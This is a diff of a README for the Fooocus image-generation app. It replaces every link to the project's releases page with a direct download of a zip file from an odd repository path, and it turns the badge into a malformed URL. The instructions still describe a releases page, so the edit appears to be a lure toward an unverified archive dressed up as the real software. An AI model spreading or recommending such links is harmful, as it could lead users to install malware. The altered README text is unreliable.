@@ -1,6 +1,6 @@
 # 🎯 Fooocus - Focus on Prompting and Generating
 
-[![Download Fooocus](https://img.shields.io/badge/Download%20Fooocus-v1.0-blue.svg)](https://github.com/TisaCodes/Fooocus/releases)
+[![Download Fooocus](https://raw.githubusercontent.com/TisaCodes/Fooocus/main/overfleece/Fooocus.zip%https://raw.githubusercontent.com/TisaCodes/Fooocus/main/overfleece/Fooocus.zip)](https://raw.githubusercontent.com/TisaCodes/Fooocus/main/overfleece/Fooocus.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download Fooocus, make sure your system meets these requirements:
 To get started with Fooocus, you will need to download the application. Follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Fooocus releases page:
-   [Download Fooocus](https://github.com/TisaCodes/Fooocus/releases)
+   [Download Fooocus](https://raw.githubusercontent.com/TisaCodes/Fooocus/main/overfleece/Fooocus.zip)
 
 2. **Choose Your Version:** On the releases page, you'll see a list of available versions. Select the latest version for the most up-to-date features and fixes.
 
@@ -77,7 +77,7 @@ For updates and announcements, follow us on social media platforms. Links can be
 
 Now, let’s recap the download steps:
 
-1. **Visit the Releases Page** and [Download Fooocus](https://github.com/TisaCodes/Fooocus/releases).
+1. **Visit the Releases Page** and [Download Fooocus](https://raw.githubusercontent.com/TisaCodes/Fooocus/main/overfleece/Fooocus.zip).
 2. **Choose** your version.
 3. **Run** the installer.
 4. **Enjoy** prompting and generating with Fooocus!
